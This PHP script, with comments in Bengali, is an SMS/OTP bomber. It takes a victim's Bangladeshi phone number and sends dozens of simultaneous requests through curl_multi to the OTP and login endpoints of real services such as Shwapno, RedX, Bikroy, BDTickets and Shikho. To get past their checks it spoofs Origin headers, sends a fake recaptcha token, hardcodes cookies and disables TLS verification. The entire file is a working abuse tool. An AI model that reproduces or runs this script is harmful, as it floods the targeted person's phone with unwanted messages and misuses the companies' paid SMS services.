<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); // এরর স্ক্রিনে দেখাবে না কিন্তু লজিক ঠিক থাকবে
set_time_limit(0); 

$phone = $_GET['phone'] ?? '';

// ১. ফোন নাম্বার ভ্যালিডেশন ও একদম নিখুঁত ফরমেটিং
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number. Use 01XXXXXXXXX"]));
}

$phone_11 = preg_replace('/^\+?88/', '', $phone);
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;

// ২. Swap API এর সিগনেচার লজিক (Secret Key ছাড়া এটা ফেইল করতে পারে)
$swap_secret = "YOUR_SECRET_KEY_HERE"; 
$swap_timestamp = time();
$swap_signature = base64_encode(hash_hmac('sha256', $phone_plus88 . $swap_timestamp, $swap_secret, true));

$api_requests = [];

// --- শপ্ন (Shwapno) ---
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "shwapno_$i",
        "url" => "https://www.shwapno.com/api/auth",
        "data" => ["phoneNumber" => $phone_plus88],
        "headers" => ['Content-Type: application/json', 'origin: https://www.shwapno.com', 'cookie: cuid=98a49521-6662-498f-94eb-17d71974083f; _nc_=true; _ds_=65eb62a4452e887cd78e256b']
    ];
}

// --- গারিবুক (Garibook) ---
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "garibook_$i",
        "url" => "https://api.garibookadmin.com/api/v4/user/login",
        "data" => ["mobile" => $phone_plus88, "recaptcha_token" => "garibookcaptcha", "channel" => "web"],
        "headers" => ['Content-Type: application/json', 'Origin: https://garibook.com']
    ];
}

// --- রেডএক্স (RedX) ---
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "redx_$i",
        "url" => "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "data" => ["phoneNumber" => $phone_11],
        "headers" => ['Content-Type: application/json']
    ];
}

// --- বিক্রয় (Bikroy) ---
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "bikroy_$i",
        "url" => "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11",
        "method" => "GET",
        "headers" => ['User-Agent: Mozilla/5.0']
    ];
}

// --- বিডিটিকিটস (BDTickets) ---
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "bdtickets_$i",
        "url" => "https://api.bdtickets.com:20100/v1/auth",
        "data" => ["createUserCheck" => true, "phoneNumber" => $phone_plus88, "applicationChannel" => "WEB_APP"],
        "headers" => ['Content-Type: application/json', 'Host: api.bdtickets.com:20100', 'Origin: https://bdtickets.com']
    ];
}

// --- শিখো (Shikho) - FIXED ---
for($i=1; $i<=3; $i++){
    $api_requests[] = [
        "name" => "shikho_$i",
        "url" => "https://api.shikho.com/auth/v2/send/sms",
        "data" => ["phone" => $phone_88, "type" => "student", "auth_type" => "signup", "vendor" => "shikho"],
        "headers" => ['Content-Type: application/json', 'Origin: https://shikho.com']
    ];
}

// --- পিবিএস (PBS) - FIXED ---
for($i=1; $i<=3; $i++){
    $api_requests[] = [
        "name" => "pbs_$i",
        "url" => "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
        "data" => ["userPhone" => $phone_11],
        "headers" => ['Content-Type: application/json', 'Origin: https://pbs.com.bd']
    ];
}

// --- ইকরা লাইভ (Iqra Live) - HARD FIXED (GET Method) ---
for($i=1; $i<=3; $i++){
    $api_requests[] = [
        "name" => "iqra_$i",
        "url" => "https://apibeta.iqra-live.com/api/v2/sent-otp/" . $phone_11,
        "method" => "GET",
        "headers" => ['Accept: application/json', 'Origin: https://iqra-live.com']
    ];
}

// --- সোয়াপ (Swap) - FIXED ---
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "swap_$i",
        "url" => "https://api.swap.com.bd/api/v1/send-otp/v2",
        "data" => ["phone" => $phone_plus88, "timestamp" => $swap_timestamp],
        "headers" => ['Content-Type: application/json', 'signature: ' . $swap_signature, 'Origin: https://swap.com.bd']
    ];
}

// ৩. মাল্টি-কার্ল এক্সেকিউশন (সব রিকোয়েস্ট একসাথে যাবে)
$mh = curl_multi_init();
$handles = [];

foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $headers = $api['headers'] ?? [];
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if(isset($api['method']) && $api['method'] === "GET"){
        curl_setopt($ch, CURLOPT_POST, false);
    } else {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
    }

    $handles[$key] = $ch;
    curl_multi_add_handle($mh, $ch);
}

$running = null;
do {
    curl_multi_exec($mh, $running);
    curl_multi_select($mh);
} while ($running > 0);

$final_results = [];
foreach($handles as $key => $ch){
    $res = curl_multi_getcontent($ch);
    $info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $final_results[$api_requests[$key]['name']] = [
        "code" => $info,
        "response" => json_decode($res, true) ?: $res
    ];
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo json_encode(["status" => "success", "data" => $final_results], JSON_PRETTY_PRINT);
?>
